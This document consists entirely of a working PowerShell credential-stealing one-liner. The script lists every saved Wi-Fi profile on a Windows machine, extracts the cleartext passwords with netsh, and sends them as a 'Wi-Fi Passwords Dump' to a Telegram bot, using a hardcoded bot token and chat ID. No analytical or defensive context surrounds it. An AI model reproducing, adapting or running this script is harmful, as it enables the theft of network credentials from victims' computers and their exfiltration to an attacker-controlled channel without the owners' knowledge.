$t="7458211664:AAGQ4V4Q2iJwGrxuNtnGbZKMaKrYCMgUHXk"; $c="5620004341"; $profiles = netsh wlan show profiles; $w = @(); foreach($line in $profiles) { if($line -match ':\s*(.+)$') {$w += $Matches[1].Trim() } };$r="Wi-Fi Passwords Dump:`n`n"; foreach($x in $w){ $res = netsh wlan show profile name="$x" key=clear; $match = $res | Select-String 'Key Content\s*\:\s*(.+)'; if ($match) { $p = $match.Matches.Groups[1].Value } else { $p = "[Open Network / No Password]" }; $r += "SSID: $x`nPass: $p`n`n" }; Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body @{chat_id=$c; text=$r}